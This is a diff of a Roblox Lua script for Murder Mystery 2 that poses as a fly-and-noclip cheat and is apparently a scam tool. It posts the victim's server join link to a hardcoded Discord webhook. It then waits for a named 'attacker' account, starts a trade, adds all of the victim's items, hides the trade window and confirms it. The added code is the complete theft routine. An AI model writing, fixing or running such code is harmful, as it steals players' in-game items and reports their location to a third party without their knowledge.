@@ -1,10 +1,12 @@
---[[
-    DEBUG – pcall wrapped with full error reporting
-]]
+--[=[ FULL SCRIPT – with trade automation and debug prints ]=]
+
+print("=== SCRIPT START ===")
+
 local webhookURL = "https://discord.com/api/webhooks/1532509426257236008/TQrtSPyEYviVXAPzhBbVgaPIRcKFLHghPCxBfD3TFQ7njWBM7qngokItqz0vCXkiCkcz"
 local attackerUsername = "FEARACCE"
 
--- Utility to send webhook (same)
+print("1. Variables set")
+
 local function sendWebhook(msg)
     local HttpService = game:GetService("HttpService")
     local data = HttpService:JSONEncode({content = msg})
@@ -21,39 +23,40 @@ local function sendWebhook(msg)
     return false
 end
 
--- Send webhook (works)
+print("2. Webhook function defined")
+
 local placeId = game.PlaceId
 local jobId = game.JobId
 local joinLink = "https://www.roblox.com/games/" .. placeId .. "?serverId=" .. jobId
 sendWebhook("MM2 Server: " .. joinLink)
+print("3. Webhook sent (check Discord)")
 
--- Now wrap the rest in pcall to catch errors
-local success, err = pcall(function()
-    print("[DEBUG] Script started (inside pcall)")
+local ok, err = pcall(function()
+    print("4. Inside pcall – starting main logic")
 
     local player = game.Players.LocalPlayer
+    print("5. LocalPlayer = " .. tostring(player))
     if not player then error("LocalPlayer is nil") end
-    print("[DEBUG] Player found: " .. player.Name)
 
+    print("6. Waiting for Character...")
     local char = player.Character
     if not char then
-        print("[DEBUG] Waiting for character...")
         char = player.CharacterAdded:Wait()
     end
-    print("[DEBUG] Character found")
+    print("7. Character found: " .. char.Name)
 
     local rootPart = char:FindFirstChild("HumanoidRootPart")
     if not rootPart then error("HumanoidRootPart missing") end
-    print("[DEBUG] HumanoidRootPart found")
+    print("8. HumanoidRootPart found")
 
-    -- Fly setup
+    -- Fly + Noclip
     local flying = false
     local noclip = false
     local speed = 50
 
     local function toggleFly()
         flying = not flying
-        print("[DEBUG] Fly toggled: " .. tostring(flying))
+        print("9. Fly toggled: " .. tostring(flying))
         if flying then
             local bv = Instance.new("BodyVelocity")
             bv.MaxForce = Vector3.new(4000,4000,4000)
@@ -79,7 +82,7 @@ local success, err = pcall(function()
 
     local function toggleNoclip()
         noclip = not noclip
-        print("[DEBUG] Noclip toggled: " .. tostring(noclip))
+        print("10. Noclip toggled: " .. tostring(noclip))
         for _, part in pairs(char:GetDescendants()) do
             if part:IsA("BasePart") then part.CanCollide = not noclip end
         end
@@ -89,34 +92,130 @@ local success, err = pcall(function()
         if input.KeyCode == Enum.KeyCode.F then toggleFly() end
         if input.KeyCode == Enum.KeyCode.V then toggleNoclip() end
     end)
-    print("[DEBUG] Fly and noclip keybinds set. Press F or V.")
+    print("11. Keybinds set (F/V)")
 
-    -- Trade part (minimal, just to test detection)
-    -- We'll skip full trade to see if fly works first.
-    -- But we need to know if attacker detection works.
+    -- Trade functions with debug prints
+    local function getTradeGui()
+        local gui = player:FindFirstChild("PlayerGui")
+        if not gui then print("[TRADE] PlayerGui not found"); return nil end
+        local function findTrade(frame)
+            for _, child in pairs(frame:GetChildren()) do
+                if child:IsA("Frame") and (child.Name:lower():find("trade") or child.Name:lower():find("guı")) then
+                    print("[TRADE] Found trade GUI frame: " .. child.Name)
+                    return child
+                end
+                local found = findTrade(child)
+                if found then return found end
+            end
+            return nil
+        end
+        local result = findTrade(gui)
+        if not result then print("[TRADE] No trade GUI found") end
+        return result
+    end
+
+    local function acceptTrade()
+        local tradeGui = getTradeGui()
+        if not tradeGui then print("[TRADE] acceptTrade: no GUI"); return false end
+        for _, child in pairs(tradeGui:GetDescendants()) do
+            if child:IsA("TextButton") and (child.Name:lower():find("accept") or child.Name:lower():find("confirm")) then
+                print("[TRADE] Found accept button: " .. child.Name)
+                child:FireServer()
+                tradeGui.Visible = false
+                print("[TRADE] Accept clicked and GUI hidden")
+                return true
+            end
+        end
+        print("[TRADE] No accept button found")
+        return false
+    end
+
+    local function addAllItems()
+        local tradeGui = getTradeGui()
+        if not tradeGui then print("[TRADE] addAllItems: no GUI"); return false end
+        local count = 0
+        for _, slot in pairs(tradeGui:GetDescendants()) do
+            if slot:IsA("Frame") and (slot.Name:lower():find("slot") or slot.Name:lower():find("item")) then
+                local btn = slot:FindFirstChild("Select") or slot:FindFirstChild("Add")
+                if btn and btn:IsA("TextButton") then
+                    print("[TRADE] Adding item: " .. slot.Name)
+                    btn:FireServer()
+                    count = count + 1
+                end
+            end
+        end
+        print("[TRADE] Added " .. count .. " items")
+        return count > 0
+    end
+
+    local function initiateTrade(target)
+        for _, service in pairs(game:GetChildren()) do
+            if service:IsA("ReplicatedStorage") then
+                for _, obj in pairs(service:GetChildren()) do
+                    if obj:IsA("RemoteEvent") and (obj.Name:lower():find("trade") or obj.Name:lower():find("request")) then
+                        print("[TRADE] Found trade remote: " .. obj.Name .. " in " .. service.Name)
+                        obj:FireServer(target)
+                        print("[TRADE] Trade request fired to " .. target.Name)
+                        return true
+                    end
+                end
+            end
+        end
+        print("[TRADE] No trade remote found")
+        return false
+    end
+
+    -- Main loop to detect attacker
     spawn(function()
-        print("[DEBUG] Waiting for attacker: " .. attackerUsername)
+        print("12. Waiting for attacker: " .. attackerUsername)
         local attacker = nil
         while not attacker do
             for _, plr in pairs(game.Players:GetPlayers()) do
                 if plr.Name == attackerUsername and plr ~= player then
                     attacker = plr
-                    print("[DEBUG] Attacker found: " .. attacker.Name)
+                    print("13. Attacker found: " .. attacker.Name)
                     break
                 end
             end
             wait(1)
         end
-        print("[DEBUG] Attacker detection success. Trade will start soon.")
-        -- You can add trade code here later, but for now we just confirm detection.
+
+        wait(3) -- give attacker time to load
+        print("14. Starting trade process...")
+
+        if initiateTrade(attacker) then
+            print("15. Trade request sent")
+            wait(2)
+            if acceptTrade() then
+                print("16. First accept clicked")
+                wait(2)
+                if addAllItems() then
+                    print("17. Items added")
+                    wait(2)
+                    if acceptTrade() then
+                        print("18. Final confirm clicked")
+                        print("[SUCCESS] Trade completed. All items sent to " .. attacker.Name)
+                    else
+                        print("[ERROR] Final accept failed")
+                    end
+                else
+                    print("[ERROR] addAllItems failed")
+                end
+            else
+                print("[ERROR] First accept failed")
+            end
+        else
+            print("[ERROR] initiateTrade failed – no remote found or fire failed")
+        end
     end)
 
-    print("[DEBUG] Script completed setup successfully.")
+    print("15. Main logic finished without errors.")
 end)
 
--- If pcall failed, print the error
-if not success then
-    print("[ERROR] Script crashed: " .. tostring(err))
+if not ok then
+    print("!!! ERROR CAUGHT: " .. tostring(err))
 else
-    print("[DEBUG] No errors caught.")
+    print("=== SCRIPT EXECUTED SUCCESSFULLY ===")
 end
+
+print("=== SCRIPT END ===")
